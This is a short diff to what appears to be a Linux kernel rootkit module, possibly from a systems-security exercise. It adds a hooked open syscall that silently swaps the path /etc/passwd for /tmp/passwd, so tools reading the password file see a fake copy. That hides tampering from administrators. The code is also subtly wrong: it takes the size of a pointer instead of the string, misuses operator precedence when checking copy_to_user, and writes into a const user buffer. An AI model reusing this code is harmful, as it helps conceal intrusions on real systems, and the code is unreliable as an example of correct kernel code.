@@ -23,6 +23,7 @@
 //#include <dirent.h>
 #define BUFFLEN 1024
 #define SNEAKY "sneaky_process"
+#define PASSWD "/etc/passwd"
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -68,8 +69,21 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-  //printk(KERN_INFO "Very, very Sneaky!\n");
+  //PASSWD size
+  size_t SIZE = sizeof(PASSWD) - 1;
+  int result;
+  //check if pathname matches /etc/passwd
+  if (strncmp(pathname, PASSWD, SIZE) == 0) {
+    const char * fake_path = "/tmp/passwd";
+    size_t fake_size = sizeof(fake_path);
+    //copy fake path to user space
+    if (result = copy_to_user(pathname, fake_path, fake_size)!=0) {
+      //can't copy memory to user space
+      return -EAGAIN;
+    }
+  }
   return original_call(pathname, flags);
+  
 }
 
 
